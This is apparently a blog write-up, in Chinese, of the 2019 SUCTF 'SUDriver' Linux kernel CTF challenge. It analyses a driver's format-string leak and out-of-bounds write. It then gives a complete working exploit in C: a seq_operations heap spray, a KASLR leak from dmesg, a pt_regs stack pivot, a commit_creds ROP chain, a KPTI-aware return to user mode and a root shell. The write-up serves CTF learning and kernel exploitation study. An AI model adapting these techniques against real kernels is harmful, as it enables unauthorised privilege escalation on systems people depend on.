---
title: "2019 SUCTF SUDriver | Heap Spray & seq_operations"
date: 2026-05-11T22:20:44+08:00
lastmod: 2026-05-11T18:00:00+08:00
draft: false
author: xnqjns

description: "2019 SUCTF 内核题"

categories: 
  - "Pwn-内核态"

tags: 
  - "heap spray"
  - "seq_operations"
  - "Stack Pivot"
---



## 环境分析

启动脚本中开启了 `smep` 和 `kaslr`，内核版本为 `4.20.12`

~~~bash
#! /bin/sh
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=0 kaslr" \
-monitor /dev/null \
-nographic 2>/dev/null \
-smp cores=2,threads=1 \
-s \
-cpu kvm64,+smep

/ $ cat /sys/devices/system/cpu/vulnerabilities/meltdown
Mitigation: PTI

Linux (none) 4.20.12 #1 SMP Mon Feb 25 20:42:55 CST 2019 x86_64 GNU/Linux
~~~



## 驱动分析

### ioctl

`0x73311337` 是创建一个堆块，大小自定义，最大 `0xFFE`，`0x13377331` 是释放堆块，在利用中没什么用

~~~C
void __fastcall sudrv_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x73311337:
      if ( (unsigned __int64)(a3 - 1) <= 0xFFE )
        su_buf = (char *)_kmalloc(a3, 4718624LL);
      break;
    case 0xDEADBEEF:
      if ( su_buf )
        sudrv_ioctl_cold_2((__int64)su_buf);
      break;
    case 0x13377331:
      kfree(su_buf);
      su_buf = 0LL;
      break;
  }
}
~~~

### 格式化字符串漏洞

明显的一个**格式化字符串**漏洞，可以用于**泄露内核基地址**

~~~C
void __fastcall sudrv_ioctl_cold_2(__int64 a1)
{
  printk(a1);
  JUMPOUT(0x38LL);
}
~~~

### 越界写漏洞

这个函数是IDA识别错误，底层还是write函数，参数分别为文件操作符，写入数据，写入长度，长度我们可以自定义，所以这是一个**越界写**

~~~C
__int64 sudrv_write()
{
  if ( (unsigned int)copy_user_generic_unrolled(su_buf) )
    return -1LL;
  else
    return sudrv_write_cold_1();
}
~~~



## 利用思路

有任意地址写，而且内核版本 `4.20.12` 的环境下 ，可以大概是只能利用**越界写修改结构体指针**的方式控制内核执行流，我原本打算利用 tty_struct 结构体的，但是这个环境没有挂载 `devpts` 伪文件系统，所以用了 `seq_operations` 结构体来做平替

**小提示 :** 这道题没有开启在 `4.14` 引入的 `Hardened freelist` 所以，劫持 `modprobe_path` 也是一个不错的选择

**踩坑 :** 我还尝试了 `timerfd_ctx` 结构体，但是越界写破坏了红黑树节点，虽然程序没有开启 `smap`，我们可以在用户态伪造红黑树节点，但是因为该版本的`timerfd_ctx` 结构体偏移问题，没有合适的 `gadget` 可用，最后放弃了



---

{{< admonition type="tip" title="💡 小提示：另一种解法 (`modprobe_path`)" open=true >}} 

在审计环境时发现，这道题的内核并没有开启在 4.14 版本中引入的 **Hardened freelist** (`CONFIG_SLAB_FREELIST_HARDENED`)。因此，除了劫持控制流走 ROP 之外，利用任意地址写直接劫持 `modprobe_path` 也是一个极其高效且稳定的备选方案。

{{< /admonition >}} 



{{< admonition type="bug" title="🚧 踩坑记录：为什么放弃 `timerfd_ctx`？" open=true >}} 

在敲定 `seq_operations` 之前，我还尝试过利用 `timerfd_ctx` 结构体。

**失败原因分析：** 越界写虽然能修改指针，但不可避免地破坏了该结构体内部的红黑树节点。虽然目标环境没有开启 `SMAP`，理论上允许我们在用户态伪造红黑树节点来修复结构，但由于 `4.20.12` 版本中 `timerfd_ctx` 结构体的具体偏移问题，很难找到能够完美契合的 `ROP Gadget`，最终放弃了这条利用链 

{{< /admonition >}}



### 堆喷构造利用环境

真的是很奇怪，不知道为什么用户堆块就是进不去梳子型的堆喷....

~~~C
//基础的用户态状态保存,绑核和获取驱动交互接口
save_status();
bind_core(0);
dev_fd = open("/dev/meizijiutql", O_RDWR);

if (dev_fd < 0) 
{
	perror("[-] Failed to open /dev/meizijiutql");
    exit(EXIT_FAILURE);
}
printf("[+] Successfully opened device!\n");
~~~



我采用了 **[堆喷，创建堆块，堆喷]** 的方式完成堆布局

~~~C
#define MAX_SPRAY_SIZE 1000

for (int i = 0;i < MAX_SPRAY_SIZE-300;i++)
{
	operations_id[i] = open("/proc/self/stat",O_RDONLY);
	if (operations_id[i] < 0)
	{
		printf("[-] failed to create seq_operations[%d]\n",i);
		exit(EXIT_FAILURE);
	}
}
	
printf("[+] Success to spray seq_operations[0-%d]\n",MAX_SPRAY_SIZE-300);
	
Addchunk(0x20);
	
for (int i = MAX_SPRAY_SIZE-300;i < MAX_SPRAY_SIZE;i++)
{
	operations_id[i] = open("/proc/self/stat",O_RDONLY);
	if (operations_id[i] < 0)
	{
		printf("[-] failed to create seq_operations[%d]\n",i);
		exit(EXIT_FAILURE);
	}
}
~~~



我们往创建出来的的堆块写入一些数据，一会动态检查是否构造完成了

~~~asm
size_t buf[2];
buf[0] = 0xDEADBEEFDEADBEEF;
buf[1] = 0xDEADBEEFDEADBEEF;
write(dev_fd,buf,0x10);

//---------------------------------(nokaslr 内存图)------------------------------------
//这三个是符合0x20大小堆块地址的可疑地址
(remote) gef➤  search-pattern 0xdeadbeefdeadbeef
[+] In (0xffff888002114000-0xffff888005fa6000), permission=rw-
  0xffff888002a0fd60 - 0xffff888002a0fd80  →   "\xef\xbe\xad\xde\xef\xbe\xad\xde[...]" 
  0xffff888002a0fd68 - 0xffff888002a0fd88  →   "\xef\xbe\xad\xde\xef\xbe\xad\xde[...]" 
[+] In (0xffff888005fa8000-0xffff8880071c4000), permission=rw-
  0xffff888005fc0940 - 0xffff888005fc0960  →   "\xef\xbe\xad\xde\xef\xbe\xad\xde[...]" 
  0xffff888005fc0948 - 0xffff888005fc0968  →   "\xef\xbe\xad\xde\xef\xbe\xad\xde[...]" 
[+] In (0xffffffff82878000-0xffffffff82c00000), permission=rw-
  0xffffffff82a0fd60 - 0xffffffff82a0fd80  →   "\xef\xbe\xad\xde\xef\xbe\xad\xde[...]" 
  0xffffffff82a0fd68 - 0xffffffff82a0fd88  →   "\xef\xbe\xad\xde\xef\xbe\xad\xde[...]" 

(remote) gef➤  x/10gx 0xffff888002a0fd60					//(排除)
0xffff888002a0fd60:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0xffff888002a0fd70:	0x0000000600000000	0xf90c82ac8f4da200
0xffff888002a0fd80:	0x0000000000000001	0x000000000040206a

    
(remote) gef➤  x/10gx 0xffff888005fc0940
0xffff888005fc0940:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0xffff888005fc0950:	0x0000000000000000	0x0000000000000000
0xffff888005fc0960:	0xffffffff811d8a50	0xffffffff811d8a70

    
(remote) gef➤  x/10gx 0xffffffff82a0fd60					//(排除)
0xffffffff82a0fd60:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0xffffffff82a0fd70:	0x0000000600000000	0xf90c82ac8f4da200
0xffffffff82a0fd80:	0x0000000000000001	0x000000000040206a
    
//我们可以用 / # cat /proc/kallsyms | grep "single_start" 查询 seq_operations -> start的地址,然后在我们的堆块附近搜索这个地址
        
(remote) gef➤  find /g 0xffff888005000000, +0x1000000, 0xffffffff811d8a50
0xffff888005f85000
0xffff888005f85020
....
0xffff888005fc0920
0xffff888005fc0960					//我们堆块下面就是seq_operations结构体,堆布局完成了
....
0xffff888005fdbea0
0xffff888005fdbec0
630 patterns found.
~~~



### 泄露内核基地址

在 `nokaslr` 环境下利用格式化字符串泄露栈上的函数地址，然后计算偏移后，就可以用在 `kaslr` 环境下了

~~~C
#define KERNEL_BASE 0xffffffff81000000
#define DO_VFS_IOCTL 0xffffffff811c81e0
#define LEAK_INTERNAL_OFFSET 0x9f
#define PREPARE_KERNEL_CRED 0xffffffff81081790
#define CPMMIT_CREDS 0xffffffff81081410

char buf[0x20] = {0};
strcat(buf, "[Exploit_Leak]:");
for(int i = 0; i < 8; i++) 
{
    strcat(buf, "%llx-"); 				//注意驱动中用的是printk,所以我们要用%llx
}
strcat(buf, "\n");
    
printf("[*] Sending format string to kernel...\n");
write(dev_fd, buf, strlen(buf));
    
printf("[*] Triggering printk...\n");
Showsomething();
    
sleep(3);

//从dmesg中读取驱动输出给我的内容,经过处理后就可以得到一个固定偏移
char log_buf[0x2000] = {0};
size_t dynamic_do_vfs_ioctl = 0;
size_t kernel_offset = 0;
    
int bytes_read = klogctl(3, log_buf, sizeof(log_buf) - 1);
if (bytes_read > 0) 
{
    char *match = strstr(log_buf, "[Exploit_Leak]:");
    if (match) 
    {
        printf("[+] Leak found via syslog: %s\n", match);
            
        char *newline = strchr(match, '\n');
        if (newline) *newline = '\0';
            
        uint64_t leak_addr = 0;
        char *token = strtok(match, "-");
        while (token != NULL) 
        {
            if (strncmp(token, "ffffffff", 8) == 0) 
            {
				sscanf(token, "%lx", &leak_addr);
				printf("[+] leak_addr = 0x%lx\n",leak_addr);
                kernel_offset = leak_addr - DO_VFS_IOCTL - LEAK_INTERNAL_OFFSET;
                printf("[+] kernel_offset = 0x%lx\n",kernel_offset);
                break;
            }
            token = strtok(NULL, "-");
        }
    }
}
~~~



### 利用pt_regs结构体部署ROP链

当我们 `read` 一个 `stat` 文件时，内核会调用其 `proc_ops` 的 `proc_read_iter` 指针，其默认值为 `seq_read_iter()` 函数，定义于 `fs/seq_file.c` 中，注意到有如下逻辑

~~~c
ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
{
    struct seq_file *m = iocb->ki_filp->private_data;

    p = m->op->start(m, &m->index);

~~~

即其会调用 `seq_operations` 中的 `start` 函数指针，那么**我们只需要控制 `seq_operations->start` 后再读取对应 `stat` 文件便能控制内核执行流**

同时在我们执行内核调用时，会在栈底形成一个 `pt_regs` 结构体，结构如下

~~~asm
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
    unsigned long r15;
    unsigned long r14;
    unsigned long r13;
    unsigned long r12;
    unsigned long rbp;
    unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
    unsigned long r11;
    unsigned long r10;
    unsigned long r9;
    unsigned long r8;
    unsigned long rax;
    unsigned long rcx;
    unsigned long rdx;
    unsigned long rsi;
    unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
    unsigned long orig_rax;
/* Return frame for iretq */
    unsigned long rip;
    unsigned long cs;
    unsigned long eflags;
    unsigned long rsp;
    unsigned long ss;
/* top of stack page */
};
~~~

假设我们能计算出我们在 `read` 一个 `stat` 文件时的栈指针和 `pt_regs` 结构体的距离，我们就能通过往 `start` 指针写入一个类似`add rsp 0xxxx; ret;` 的 `gadget` 完成控制内核执行流

### 利用 swapgs_restore_regs_and_return_to_usermode 返回用户态

注意程序开启了 `KPTI`，我们可以使用 `swapgs_restore_regs_and_return_to_usermode` 函数加上一个偏移完成丝滑返回用户态，下面是原理分析，感兴趣可以看看

~~~asm
/*
先看后面的内联汇编,假设我们在rbp寄存器完成了所有ROP的布局,接下来我们要返回用户态,我们可以看到pt_regs结构体和这里的pop是高度相似的
所以我们可以把后面多余的寄存器弹出,我们接下来处理到了rbx,那么偏移就是FFFFFFFF81C00F39 - FFFFFFFF81C00F30 = 9
最主要的问题,rdi和orig_rax怎么处理?
可以看到内核把rdi当作一个中转站mov     rdi, rsp
然后切换的新的栈mov     rsp, gs:qword_6004
再把对应偏移的数据全部压入新的栈 push    qword ptr [rdi+30h]........
最后的栈是这样的[ RAX ] -> [ RDI(seq_fd) ] -> [ RIP ] -> [ CS ] -> [ RFLAGS ] -> [ RSP ] -> [ SS ]

然后跳转到loc_FFFFFFFF81C00FA9执行pop rax; pop rdi;这样子最后执行iretq就可以安全放回了
这就是前面说我们可以把这部分简略为pop rax; pop rdi; swapgs; iretq;的原因了
*/
.text:FFFFFFFF81C00F30 loc_FFFFFFFF81C00F30:                   ; CODE XREF: .text:FFFFFFFF81004475↑j
.text:FFFFFFFF81C00F30                                         ; .text:FFFFFFFF81C0009C↑j ...
.text:FFFFFFFF81C00F30                 pop     r15
.text:FFFFFFFF81C00F32                 pop     r14
.text:FFFFFFFF81C00F34                 pop     r13
.text:FFFFFFFF81C00F36                 pop     r12
.text:FFFFFFFF81C00F38                 pop     rbp
.text:FFFFFFFF81C00F39                 pop     rbx
.text:FFFFFFFF81C00F3A                 pop     r11
.text:FFFFFFFF81C00F3C                 pop     r10
.text:FFFFFFFF81C00F3E                 pop     r9
.text:FFFFFFFF81C00F40                 pop     r8
.text:FFFFFFFF81C00F42                 pop     rax
.text:FFFFFFFF81C00F43                 pop     rcx
.text:FFFFFFFF81C00F44                 pop     rdx
.text:FFFFFFFF81C00F45                 pop     rsi
.text:FFFFFFFF81C00F46                 mov     rdi, rsp
.text:FFFFFFFF81C00F49                 mov     rsp, gs:qword_6004
.text:FFFFFFFF81C00F52                 push    qword ptr [rdi+30h]
.text:FFFFFFFF81C00F55                 push    qword ptr [rdi+28h]
.text:FFFFFFFF81C00F58                 push    qword ptr [rdi+20h]
.text:FFFFFFFF81C00F5B                 push    qword ptr [rdi+18h]
.text:FFFFFFFF81C00F5E                 push    qword ptr [rdi+10h]
.text:FFFFFFFF81C00F61                 push    qword ptr [rdi]
.text:FFFFFFFF81C00F63                 push    rax
.text:FFFFFFFF81C00F64                 jmp     short loc_FFFFFFFF81C00FA9
.text:FFFFFFFF81C00F64 ; END OF FUNCTION CHUNK FOR sub_FFFFFFFF81C010F0
----------------------------------------------------------------------------------------------------------------------
.text:FFFFFFFF81C00FA9 loc_FFFFFFFF81C00FA9:                   ; CODE XREF: sub_FFFFFFFF81C010F0-18C↑j
.text:FFFFFFFF81C00FA9                 pop     rax
.text:FFFFFFFF81C00FAA                 pop     rdi
.text:FFFFFFFF81C00FAB                 call    cs:off_FFFFFFFF82641B28
.text:FFFFFFFF81C00FB1                 jmp     cs:off_FFFFFFFF82641B20
.text:FFFFFFFF81C00FB1 ; END OF FUNCTION CHUNK FOR sub_FFFFFFFF81C010F0
~~~



### 最后利用

我们在 `single_start` 函数打上断点，手动修改寄存器的值，计算距离 `pt_regs` 结构体的距离

~~~asm
#这是最后利用时的内存图,所以没有很明显,我把r15寄存器修改成 pop rdi; ret; 了,下面给出了地址,计算得出来是 0x168
(remote) gef➤  p/x $rsp
$1 = 0xffffc9000071bdf0
(remote) gef➤  x/100gx 0xffffc9000071bdf0
0xffffc9000071bdf0:	0xffffffff811d9a1d	0xffffc9000071bf08
0xffffc9000071be00:	0x0000000000000008	0xffff888006a67a40
0xffffc9000071be10:	0x00007ffcba86b2c8	0x0000000000000006
0xffffc9000071be20:	0xffff8880071d3c00	0xffffc9000071bf08
0xffffc9000071be30:	0x00007ffcba86b2c8	0xffff8880071d3c00
0xffffc9000071be40:	0xffffc9000071bf08	0x0000000000000000
0xffffc9000071be50:	0xffffffff811b4b21	0xffff888006c0acc8
0xffffc9000071be60:	0xffff8880071d3c10	0x0000000000000000
0xffffc9000071be70:	0x0000000000000001	0x0000000000000000
0xffffc9000071be80:	0x0000000000000000	0x0000000000000000
0xffffc9000071be90:	0x0000000000000000	0x45e4aaa7a09a6c00
0xffffc9000071bea0:	0x0000000000000008	0xffff8880071d3c00
0xffffc9000071beb0:	0x00007ffcba86b2c8	0x45e4aaa7a09a6c00
0xffffc9000071bec0:	0x0000000000000008	0x0000000000000000
0xffffc9000071bed0:	0xffffffff811b4ce5	0xffff8880071d3c00
0xffffc9000071bee0:	0xffff8880071d3c00	0x00007ffcba86b2c8
0xffffc9000071bef0:	0x0000000000000008	0x0000000000000000
0xffffc9000071bf00:	0xffffffff811b525a	0x0000000000000000
0xffffc9000071bf10:	0x45e4aaa7a09a6c00	0x0000000000000000
0xffffc9000071bf20:	0xffffc9000071bf58	0x0000000000000000
0xffffc9000071bf30:	0x0000000000000000	0xffffffff810023f3
0xffffc9000071bf40:	0x0000000000000000	0x0000000000000000
#0xffffc9000071bf50:	0xffffffff81a0007c	0xffffffff81001388
0xffffc9000071bf60:	0xffffffff82241c00	0xffffffff81081410
0xffffc9000071bf70:	0xffffffff81a00977	0x0000000000000000
0xffffc9000071bf80:	0x0000000000000000	0x0000000000000202
0xffffc9000071bf90:	0x0000000000000000	0x0000000000000000
0xffffc9000071bfa0:	0x0000000000000000	0xffffffffffffffda
0xffffc9000071bfb0:	0x0000000000401d7d	0x0000000000000008
0xffffc9000071bfc0:	0x00007ffcba86b2c8	0x0000000000000004
0xffffc9000071bfd0:	0x0000000000000000	0x0000000000401d7d
0xffffc9000071bfe0:	0x0000000000000033	0x0000000000000202
0xffffc9000071bff0:	0x00007ffcba86b000	0x000000000000002b
0xffffc9000071c000:	Cannot access memory at address 0xffffc9000071c000
(remote) gef➤  x/4i 0xffffffff81001388
   0xffffffff81001388:	pop    rdi
   0xffffffff81001389:	ret    
   0xffffffff8100138a:	mov    r15,QWORD PTR [rip+0x1886cef]        # 0xffffffff82888080
   0xffffffff81001391:	test   r15,r15
(remote) gef➤  

0xffffc9000071bf58 - 0xffffc9000071bdf0 = 0x168
~~~



修改 `start` 指针，依次读取所有 `start` 文件即可

~~~C
#define PUSH_RDI_POP_RSP_JE_RET 0xffffffff814a1b14
#define POP_RDI_RET 0xffffffff81001388
#define MOV_RAX_RDI_RET 0xffffffff8100e2c5
#define POP_R13_RET 0xffffffff81000a38
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A0096F
#define POP_R8_RET 0xffffffff8133bfb8
#define POP_RDX_RET 0xffffffff81044f17
#define MOV_RDI_RAX_CMP_JNE_RET 0xffffffff810d690e
#define INIT_CRED_ADDR 0xffffffff82241c00

#define ADD_RSP_168_RET 0xffffffff81134b6c

void trigger_syscall(int fd, void *buf, uint64_t *args) {
    asm volatile(
        // 1. 保护 C 运行时的寄存器
        "push r15\n"
        "push r14\n"
        "push r13\n"
        "push r12\n"
        "push rbp\n"
        "push rbx\n"
        
        // 2. 从 args 数组 (rdx) 中安全提取 ROP 链到寄存器
        "mov r15, [rdx + 0x00]\n"
        "mov r14, [rdx + 0x08]\n"
        "mov r13, [rdx + 0x10]\n"
        "mov r12, [rdx + 0x18]\n"
        "mov rbp, [rdx + 0x20]\n"
        "mov rbx, [rdx + 0x28]\n"
        "mov r11, [rdx + 0x30]\n"
        "mov r10, [rdx + 0x38]\n"
        "mov r9,  [rdx + 0x40]\n"
        "mov r8,  [rdx + 0x48]\n"
        
        // 3. 执行系统调用
        "mov rax, 0\n"      // SYS_read
        "mov rdx, 8\n"      // count = 8
        // fd 已经在 rdi 里了，buf 已经在 rsi 里了
        "syscall\n"
        
        // 4. 完美恢复 C 运行时的寄存器
        "pop rbx\n"
        "pop rbp\n"
        "pop r12\n"
        "pop r13\n"
        "pop r14\n"
        "pop r15\n"
        :
        : "D" (fd), "S" (buf), "d" (args) // GCC 约束保留，用于传参
        : "rax", "rcx", "r8", "r9", "r10", "r11", "memory"
    );
}

size_t kernel_base = KERNEL_BASE + kernel_offset;
printf("[+] kernel_base = 0x%lx\n",kernel_base);
    
prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
commit_creds = CPMMIT_CREDS + kernel_offset;
swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 8;
    
if (kernel_offset == 0) 
{
	puts("[-] KASLR Leak Failed (dmesg buffer missed)! Please run exp again.");
	exit(EXIT_FAILURE);
}
	
printf("[+] Perfect! KASLR completely defeated. Offset: 0x%lx\n", kernel_offset);
    
    
size_t buf2[0x40] = {0};
buf2[0] = 0xDEADBEEFDEADBEEF;
for (int i = 4;i < 0x40;i += 4)						//只修改start指针,其余不变,多修改几个结构体
{
	buf2[i] = ADD_RSP_168_RET + kernel_offset;
	buf2[i+1] = 0xffffffff811d8a70 + kernel_offset;
	buf2[i+2] = 0xffffffff811d8a60 + kernel_offset;
	buf2[i+3] = 0xffffffff81220e50 + kernel_offset;
}
    
write(dev_fd, buf2, 0x200);
		
size_t pop_rdi_ret = POP_RDI_RET + kernel_offset;
size_t pop_rdx_ret = POP_RDX_RET + kernel_offset;
size_t pop_r8_ret  = POP_R8_RET  + kernel_offset;
size_t mov_rdi_rax_cmp_jne_ret = 0xffffffff810d690d + kernel_offset;

int idx = 0;
    
size_t init_cred = INIT_CRED_ADDR + kernel_offset;

rop_args[idx++] = pop_rdi_ret;
rop_args[idx++] = init_cred; 
rop_args[idx++] = commit_creds;
rop_args[idx++] = swapgs_restore_regs_and_return_to_usermode;

char junk_buf[8] = {0};

for (int i = 0; i < MAX_SPRAY_SIZE; i++) {
    if (operations_id[i] < 0) {
		continue;
	}
    printf("try %d\n", i);
    trigger_syscall(operations_id[i], junk_buf, rop_args);
        
    if (getuid() == 0) {										//当我们的uid = 0时,弹出root shell,继续执行会报错!
        puts("[+] God Mode Activated! Spawning Root Shell...");
            
        system("/bin/sh");
            
        puts("[*] Shell exited. Sleeping forever to prevent kernel panic...");
        while(1) {
        	sleep(100);											//挂起进程
        }
    }
}
~~~



## 完整exp

{{< admonition type="warning" title="🚨 重要：exp的一些问题" open=true >}} 

假如在 `nokaslr` 的环境下 约 `221~225` 行的代码**要删除**，但是在 `kaslr` 环境**下一定不能删除**

~~~C
if (kernel_offset == 0) 
{
	puts("[-] KASLR Leak Failed (dmesg buffer missed)! Please run exp again.");
	exit(EXIT_FAILURE);
}
~~~

这个原因是我在从dmesg读取地址时处理不好，`kaslr` 环境下要运行两次才能获得 `root shell`

{{< /admonition >}} 

~~~C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/timerfd.h>
#include <sys/klog.h>
#include <stdint.h>
#include <sys/mman.h>
#include <signal.h>

#define MAX_SPRAY_SIZE 1000
#define KERNEL_BASE 0xffffffff81000000
#define DO_VFS_IOCTL 0xffffffff811c81e0
#define LEAK_INTERNAL_OFFSET 0x9f
#define PREPARE_KERNEL_CRED 0xffffffff81081790
#define CPMMIT_CREDS 0xffffffff81081410

#define PUSH_RDI_POP_RSP_JE_RET 0xffffffff814a1b14
#define POP_RDI_RET 0xffffffff81001388
#define MOV_RAX_RDI_RET 0xffffffff8100e2c5
#define POP_R13_RET 0xffffffff81000a38
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A0096F
#define POP_R8_RET 0xffffffff8133bfb8
#define POP_RDX_RET 0xffffffff81044f17
#define MOV_RDI_RAX_CMP_JNE_RET 0xffffffff810d690e
#define INIT_CRED_ADDR 0xffffffff82241c00

#define ADD_RSP_168_RET 0xffffffff81134b6c

int dev_fd;

size_t user_cs, user_ss, user_rflags, user_sp;

size_t prepare_kernel_cred = 0;
size_t commit_creds = 0;
size_t swapgs_restore_regs_and_return_to_usermode = 0;

int operations_id[MAX_SPRAY_SIZE];

uint64_t rop_args[20];

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status(void) {
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[*] Status has been saved.");
}

void get_root_shell(int sig) {
    if(getuid()) {
        puts("[x] Failed to get the root!");
        exit(EXIT_FAILURE);
    }
    puts("[+] Successful to get the root. Execve root shell now...");
    system("/bin/sh");
    exit(EXIT_SUCCESS);
}

void bind_core(int core) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    printf("[*] Process binded to core %d\n", core);
}

void Addchunk(size_t size) {
    ioctl(dev_fd, 0x73311337, size);
}

void Showsomething() {
    ioctl(dev_fd, 0xDEADBEEF);
}

void Freechunk() {
    ioctl(dev_fd, 0x13377331);
}

void trigger_syscall(int fd, void *buf, uint64_t *args) {
    asm volatile(
        // 1. 保护 C 运行时的寄存器
        "push r15\n"
        "push r14\n"
        "push r13\n"
        "push r12\n"
        "push rbp\n"
        "push rbx\n"
        
        // 2. 从 args 数组 (rdx) 中安全提取 ROP 链到寄存器
        "mov r15, [rdx + 0x00]\n"
        "mov r14, [rdx + 0x08]\n"
        "mov r13, [rdx + 0x10]\n"
        "mov r12, [rdx + 0x18]\n"
        "mov rbp, [rdx + 0x20]\n"
        "mov rbx, [rdx + 0x28]\n"
        "mov r11, [rdx + 0x30]\n"
        "mov r10, [rdx + 0x38]\n"
        "mov r9,  [rdx + 0x40]\n"
        "mov r8,  [rdx + 0x48]\n"
        
        // 3. 执行系统调用
        "mov rax, 0\n"      // SYS_read
        "mov rdx, 8\n"      // count = 8
        // fd 已经在 rdi 里了，buf 已经在 rsi 里了
        "syscall\n"
        
        // 4. 完美恢复 C 运行时的寄存器
        "pop rbx\n"
        "pop rbp\n"
        "pop r12\n"
        "pop r13\n"
        "pop r14\n"
        "pop r15\n"
        :
        : "D" (fd), "S" (buf), "d" (args) // GCC 约束保留，用于传参
        : "rax", "rcx", "r8", "r9", "r10", "r11", "memory"
    );
}

int main(void) {

	save_status();

    bind_core(0);
    
    dev_fd = open("/dev/meizijiutql", O_RDWR);
    if (dev_fd < 0) {
        perror("[-] Failed to open /dev/meizijiutql");
        exit(EXIT_FAILURE);
    }
    printf("[+] Successfully opened device!\n");
    
    for (int i = 0;i < MAX_SPRAY_SIZE-300;i++)
    {
		operations_id[i] = open("/proc/self/stat",O_RDONLY);
		if (operations_id[i] < 0)
		{
			printf("[-] failed to create seq_operations[%d]\n",i);
			exit(EXIT_FAILURE);
		}
    }
	
	printf("[+] Success to spray seq_operations[0-%d]\n",MAX_SPRAY_SIZE-300);
	
	Addchunk(0x20);
	
	for (int i = MAX_SPRAY_SIZE-300;i < MAX_SPRAY_SIZE;i++)
    {
		operations_id[i] = open("/proc/self/stat",O_RDONLY);
		if (operations_id[i] < 0)
		{
			printf("[-] failed to create seq_operations[%d]\n",i);
			exit(EXIT_FAILURE);
		}
    }

    char buf[0x20] = {0};
    strcat(buf, "[Exploit_Leak]:");
    for(int i = 0; i < 8; i++) {
        strcat(buf, "%llx-"); 
    }
    strcat(buf, "\n");
    
    printf("[*] Sending format string to kernel...\n");
    write(dev_fd, buf, strlen(buf));
    
    printf("[*] Triggering printk...\n");
    Showsomething();
    
    sleep(3);
    
    char log_buf[0x2000] = {0};
    size_t dynamic_do_vfs_ioctl = 0;
    size_t kernel_offset = 0;
    
    int bytes_read = klogctl(3, log_buf, sizeof(log_buf) - 1);
    if (bytes_read > 0) 
    {
        char *match = strstr(log_buf, "[Exploit_Leak]:");
        if (match) 
        {
            printf("[+] Leak found via syslog: %s\n", match);
            
            char *newline = strchr(match, '\n');
            if (newline) *newline = '\0';
            
            uint64_t leak_addr = 0;
            char *token = strtok(match, "-");
            while (token != NULL) 
            {
                if (strncmp(token, "ffffffff", 8) == 0) 
                {
					sscanf(token, "%lx", &leak_addr);
					printf("[+] leak_addr = 0x%lx\n",leak_addr);
                    kernel_offset = leak_addr - DO_VFS_IOCTL - LEAK_INTERNAL_OFFSET;
                    printf("[+] kernel_offset = 0x%lx\n",kernel_offset);
                    break;
                }
                token = strtok(NULL, "-");
            }
        }
    }
    
    size_t kernel_base = KERNEL_BASE + kernel_offset;
    printf("[+] kernel_base = 0x%lx\n",kernel_base);
    
    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
    commit_creds = CPMMIT_CREDS + kernel_offset;
    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 8;
    
    if (kernel_offset == 0) 
    {
		puts("[-] KASLR Leak Failed (dmesg buffer missed)! Please run exp again.");
		exit(EXIT_FAILURE);
	}
	
	printf("[+] Perfect! KASLR completely defeated. Offset: 0x%lx\n", kernel_offset);
    
    
    size_t buf2[0x40] = {0};
    buf2[0] = 0xDEADBEEFDEADBEEF;
	for (int i = 4;i < 0x40;i += 4)
	{
		buf2[i] = 0xffffffff81134b6c + kernel_offset;
		buf2[i+1] = 0xffffffff811d8a70 + kernel_offset;
		buf2[i+2] = 0xffffffff811d8a60 + kernel_offset;
		buf2[i+3] = 0xffffffff81220e50 + kernel_offset;
	}
    
	write(dev_fd, buf2, 0x200);
	
	size_t pop_rdi_ret = POP_RDI_RET + kernel_offset;
    size_t pop_rdx_ret = POP_RDX_RET + kernel_offset;
    size_t pop_r8_ret  = POP_R8_RET  + kernel_offset;
    size_t mov_rdi_rax_cmp_jne_ret = 0xffffffff810d690d + kernel_offset; // 用你新找的这个地址

    int idx = 0;
    
	size_t init_cred = INIT_CRED_ADDR + kernel_offset;

	rop_args[idx++] = pop_rdi_ret;
	rop_args[idx++] = init_cred; 
	rop_args[idx++] = commit_creds;
	rop_args[idx++] = swapgs_restore_regs_and_return_to_usermode;

    char junk_buf[8] = {0};

    for (int i = 0; i < MAX_SPRAY_SIZE; i++) {
        if (operations_id[i] < 0) {
            continue;
        }
        printf("try %d\n", i);
        trigger_syscall(operations_id[i], junk_buf, rop_args);
        
        if (getuid() == 0) {
            puts("[+] God Mode Activated! Spawning Root Shell...");
            
            system("/bin/sh");
            
            puts("[*] Shell exited. Sleeping forever to prevent kernel panic...");
            while(1) {
                sleep(100);
            }
        }
    }
    
    return 0;
}
~~~

